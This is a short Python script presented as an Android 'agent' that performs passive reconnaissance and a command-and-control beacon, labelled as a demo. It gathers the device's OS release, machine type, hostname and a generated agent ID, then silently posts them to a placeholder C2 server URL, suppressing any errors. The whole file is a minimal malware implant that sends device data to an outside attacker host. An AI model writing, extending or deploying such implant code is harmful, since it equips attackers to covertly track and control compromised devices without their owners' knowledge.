"""
Android Agent - CrossComPJxAI
Passive recon, device info, and C2 beacon (demo)
"""
import platform, socket, json, time, requests

C2_URL = "http://your-c2-server.com/beacon"
AGENT_ID = "android-" + str(int(time.time()))

def get_device_info():
    return {
        "agent_id": AGENT_ID,
        "platform": "Android",
        "release": platform.release(),
        "machine": platform.machine(),
        "hostname": socket.gethostname()
    }

def beacon():
    info = get_device_info()
    try:
        requests.post(C2_URL, json=info, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    beacon()